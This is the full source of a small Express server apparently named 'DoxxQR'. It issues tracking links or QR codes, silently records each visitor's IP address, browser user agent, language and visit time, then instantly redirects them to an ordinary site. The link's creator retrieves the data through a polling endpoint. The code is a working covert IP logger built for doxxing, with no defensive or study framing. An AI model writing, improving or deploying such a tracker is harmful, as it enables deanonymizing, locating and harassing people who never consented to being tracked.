const express = require("express");
const { v4: uuidv4 } = require("uuid");

const app = express();
app.use(express.json());

const PORT = process.env.PORT || 3000;

// In-memory session storage
const sessions = new Map();

// 45 minutes expiry
const SESSION_DURATION = 45 * 60 * 1000;

// Helper: validate URL
function isValidHttpsUrl(url) {
  try {
    const parsed = new URL(url);
    return parsed.protocol === "https:";
  } catch (err) {
    return false;
  }
}

// Root check
app.get("/", (req, res) => {
  res.send("DoxxQR Advanced Server Running");
});

// Create new session
app.post("/create", (req, res) => {
  const generatorIP = req.headers["x-forwarded-for"] || req.socket.remoteAddress;
  let { redirectUrl } = req.body;

  if (!redirectUrl || !isValidHttpsUrl(redirectUrl)) {
    return res.status(400).json({ error: "Invalid HTTPS redirect URL" });
  }

  // Delete old session for this IP
  for (let [id, session] of sessions.entries()) {
    if (session.generatorIP === generatorIP) {
      sessions.delete(id);
    }
  }

  const sessionId = uuidv4();
  const now = Date.now();

  const sessionData = {
    sessionId,
    generatorIP,
    redirectUrl,
    createdAt: now,
    expiresAt: now + SESSION_DURATION,
    scanData: null
  };

  sessions.set(sessionId, sessionData);

  // Auto expire
  setTimeout(() => {
    sessions.delete(sessionId);
  }, SESSION_DURATION);

  res.json({
    sessionId,
    link: `${req.protocol}://${req.get("host")}/s/${sessionId}`,
    expiresInMinutes: 45
  });
});

// Scan collector
app.get("/s/:id", (req, res) => {
  const sessionId = req.params.id;
  const session = sessions.get(sessionId);

  if (!session) {
    return res.status(404).send("Session expired or invalid.");
  }

  if (Date.now() > session.expiresAt) {
    sessions.delete(sessionId);
    return res.status(410).send("Session expired.");
  }

  // Collect info
  const ip = req.headers["x-forwarded-for"] || req.socket.remoteAddress;
  const userAgent = req.headers["user-agent"];
  const language = req.headers["accept-language"];

  session.scanData = {
    ip,
    userAgent,
    language,
    time: new Date().toISOString()
  };

  // Instant clean redirect
  res.redirect(session.redirectUrl);
});

// Get session data (dashboard polling)
app.get("/session/:id", (req, res) => {
  const session = sessions.get(req.params.id);

  if (!session) {
    return res.status(404).json({ error: "Session not found" });
  }

  res.json({
    scanData: session.scanData,
    expiresAt: session.expiresAt
  });
});

app.listen(PORT, () => {
  console.log(`Server running on port ${PORT}`);
});
